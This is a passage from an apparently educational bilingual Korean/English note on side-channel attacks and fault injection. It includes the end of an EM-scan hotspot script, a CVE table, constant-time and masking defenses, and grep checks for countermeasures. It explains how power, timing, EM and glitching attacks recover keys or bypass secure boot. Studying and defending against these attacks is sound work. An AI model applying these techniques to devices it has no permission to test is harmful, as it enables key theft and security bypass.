    ap.add_argument("--sigma", type=float, default=2.0)
    ap.add_argument("-o", "--output", type=Path, default=Path("em_scan.npy"))
    args = ap.parse_args()

    x_range = range(args.x_start, args.x_end, args.step)
    y_range = range(args.y_start, args.y_end, args.step)

    print(f"[+] EM 스캔: {len(list(x_range))}×{len(list(y_range))} 포인트")
    intensity_map = em_scan_2d(x_range, y_range, None, None)
    np.save(args.output, intensity_map)
    print(f"[+] 저장: {args.output}")

    hotspots = find_hotspots(intensity_map, args.sigma)
    print(f"[+] 핫스팟 {len(hotspots)}개:")
    for x, y, intensity in sorted(hotspots, key=lambda h: h[2], reverse=True)[:10]:
        print(f"  ({x}, {y}): {intensity:.4f}")


if __name__ == "__main__":
    main()
```

---

## 8. 관련 CVE 및 실제 사례

| CVE/사례 | 대상 | 공격 유형 | 내용 |
|---------|------|----------|------|
| CVE-2020-3580 | Cisco ASA | 전압 글리칭 | ROMMON 부트로더 패스워드 우회 |
| CVE-2017-6168 | F5 TLS | 타이밍 공격 | ROBOT: RSA 패딩 오라클 타이밍 |
| CVE-2022-21449 | Java ECDSA | 구현 오류 | Psychic Signatures: r=0 서명 검증 통과 |
| Rowhammer (2014) | DRAM | 물리적 결함 | 반복 메모리 접근으로 인접 셀 비트 플립 |
| Plundervolt (2019) | Intel SGX | 전압 조작 | SGX 인클레이브 내 계산 결함 유도 |
| Spectre/Meltdown | CPU | 캐시 타이밍 | 투기적 실행 + Flush+Reload |
| YubiKey 공격 (2024) | Infineon SLE | EM 사이드채널 | ECDSA 개인키 복구 |

---

## 9. 방어 기법

### 9.1 소프트웨어 레벨

```c
// 상수 시간 메모리 비교 (타이밍 공격 방어)
int constant_time_memcmp(const uint8_t *a, const uint8_t *b, size_t len) {
    uint8_t diff = 0;
    for (size_t i = 0; i < len; i++) {
        diff |= a[i] ^ b[i];
    }
    return diff;  // 0이면 동일
}

// 마스킹 (DPA 방어): AES SubBytes 마스킹
uint8_t masked_sbox(uint8_t x, uint8_t mask_in, uint8_t mask_out) {
    return SBOX[x ^ mask_in] ^ mask_out;
}
```

### 9.2 하드웨어 레벨

| 방어 기법 | 대상 공격 | 구현 방법 |
|---------|---------|---------|
| 전력 필터링 | DPA/CPA | 디커플링 커패시터, 전압 레귤레이터 |
| 잡음 추가 | DPA | 더미 연산, 랜덤 클락 지터링 |
| 셔필링 | DPA/DEMA | 연산 순서 무작위화 |
| 이중 레일 로직 | DPA | CMOS 차동 로직 (전력 소비 일정) |
| 글리치 탐지기 | 전압/클락 글리칭 | 전압 모니터, 클락 주파수 감지기 |
| 메시 보호층 | 레이저 | 칩 상단 금속 메시 (조사 시 감지) |
| 온도 센서 | LFI | 레이저 조사 시 온도 상승 감지 |

---

## 법적 고지

이 자료의 기법은 **자신이 소유하거나 명시적 서면 허가를 받은 장치**에 한해 수행해야 한다. 전압·클락 글리칭은 장치를 영구 손상시킬 수 있다. 레이저 폴트 인젝션은 고출력 레이저 취급 안전 교육이 선행되어야 한다.

---

<!-- detect-validate-34 -->
## 사이드채널·폴트 주입 내성 검증

사이드채널·폴트 주입은 *전력/타이밍/EM 누출과 전압·클락·레이저 글리칭*으로 키 복구나 보안 검사 우회를 노린다. 이런 공격은 로그에 거의 안 남으므로 방어자는 **대응책이 실제로 적용됐는지**를 검증해야 한다. 검증은 **소유 기기**에서만.

### 공격 → 노리는 약점 → 1차 통제(방어자) → 검증 신호

| 기법 | 노리는 약점 | 1차 통제(방어자) | 검증 신호 |
|---|---|---|---|
| 전력 분석(DPA/CPA) | 데이터 의존 소비 | 마스킹·노이즈 | 키↔전력 상관 무 |
| 타이밍 공격 | 비상수 시간 비교 | 상수시간 연산 | 입력별 시간 일정 |
| 전압/클락 글리칭 | 검사 우회 가능 | 글리치 탐지·중복검사 | 글리치 시 리셋/락 |
| 레이저 폴트 | 비트 플립 | 센서·차폐·이중화 | 폴트 시 안전정지 |

### 방어 검증 (직접 확인)

```bash
# 1) 소유 코드의 비밀 비교가 상수시간인지 정적 점검 — 조기반환(==/memcmp)이 신호
grep -rnE '(memcmp|strcmp)\s*\(.*(key|hmac|tag|secret)|if\s*\(.*==.*(token|mac)' src/ | head
# 2) 글리칭 내성 회귀 — 소유 보드에 전압 글리치 스윕 후 '검사 우회 0건' 확인(테스트 하네스 로그)
grep -cE 'bypass|skipped_check' glitch_campaign.log 2>/dev/null   # 0 이어야 함
```

> 사이드채널 방어는 *누출·우회가 없는가*다 — "기능이 동작한다"와 "키↔전력 상관이 없고 비교가 상수시간이며 글리치 시 안전정지한다"는 다르다. 소유 기기에서 대응책 적용을 직접 확인한다([[16_Cryptography]], [[61_Firmware_Hacking]], [[34_Hardware_Hacking]]).

---

<a name="english"></a>

# Side-Channel Attacks and Fault Injection

## 1. Side-Channel Attack Overview

Even if a cryptographic algorithm is mathematically secure, it is possible to recover the secret key through physical byproducts such as power consumption, electromagnetic radiation, processing time, and sound during the **implementation** stage. Side-channel attacks do not attack the algorithm itself, but measure physical characteristics of the execution environment.

```
Cryptographic operation → Power consumption pattern → Measurement → Statistical analysis → Key recovery
                          Electromagnetic radiation
                          Processing time
```

## Key Attack Types

### Simple Power Analysis (SPA)
- Directly reads the key from a single power trace
- Visible differences between processing '0' and '1' bits
- Example: RSA square-and-multiply algorithm leaks key bits

### Differential Power Analysis (DPA)
- Statistical attack using many power traces
- Does not require knowledge of the algorithm's internal structure
- Most effective against AES, DES implementations

### Timing Attacks
- Exploit time differences in algorithm execution
- Classic example: RSA timing attack (Montgomery multiplication timing)
- Remote attack possible via network timing

### Electromagnetic Analysis (EMA)
- Capture electromagnetic radiation emitted by the chip
- More targeted than power analysis
- Possible without physical contact

## Fault Injection Overview

```
Fault injection methods:
  Voltage glitching  → Brief voltage spike
  Clock glitching    → Brief clock signal manipulation
  Laser FI           → Laser irradiation on specific chip area
  Electromagnetic FI → Electromagnetic pulse injection

Goals:
  → Skip security checks (secure boot bypass)
  → Leak cryptographic keys
  → Change register values (privilege escalation)
  → Induce calculation errors (signature bypass)
```

## Countermeasures

| Countermeasure | Effective Against | Implementation |
|---------------|------------------|----------------|
| Dual-rail logic | DPA | CMOS differential logic (constant power consumption) |
| Glitch detector | Voltage/clock glitching | Voltage monitor, clock frequency detector |
| Mesh protection layer | Laser | Metal mesh on top of chip (detected when irradiated) |
| Temperature sensor | LFI | Detects temperature rise when laser irradiated |

---

## Legal Notice

The techniques in this material must only be performed on **devices you own or have explicit written permission** for. Voltage and clock glitching can permanently damage devices. Laser fault injection requires prior safety training for high-power laser handling.


<!-- detect-validate-34 -->
## Side-Channel / Fault-Injection Resistance Validation

Side-channel and fault injection aim to recover keys or bypass security checks via *power/timing/EM leakage and voltage/clock/laser glitching*. These attacks leave almost no logs, so defenders must verify **whether countermeasures are actually in place**. Validate only on **owned devices**.

### Attack -> Targeted weakness -> Primary control (defender) -> Validation signal

| Technique | Targeted weakness | Primary control (defender) | Validation signal |
|---|---|---|---|
| Power analysis (DPA/CPA) | Data-dependent draw | Masking, noise | No key<->power correlation |
| Timing attack | Non-constant compare | Constant-time ops | Time uniform across inputs |
| Voltage/clock glitch | Check is bypassable | Glitch detect, recheck | Reset/lock on glitch |
| Laser fault | Bit flip | Sensors, shield, redundancy | Safe-halt on fault |

### Defense validation (verify directly)

```bash
# 1) Static check that owned code compares secrets in constant time — early return (==/memcmp) is the signal
grep -rnE '(memcmp|strcmp)\s*\(.*(key|hmac|tag|secret)|if\s*\(.*==.*(token|mac)' src/ | head
# 2) Glitch-resistance regression — after a voltage-glitch sweep on the owned board, confirm '0 bypasses' (test-harness log)
grep -cE 'bypass|skipped_check' glitch_campaign.log 2>/dev/null   # should be 0
```

> Side-channel defense is *whether leakage/bypass is absent* -- "the feature works" differs from "no key<->power correlation, comparisons are constant-time, and a glitch triggers a safe-halt". Confirm countermeasures on owned devices directly ([[16_Cryptography]], [[61_Firmware_Hacking]], [[34_Hardware_Hacking]]).
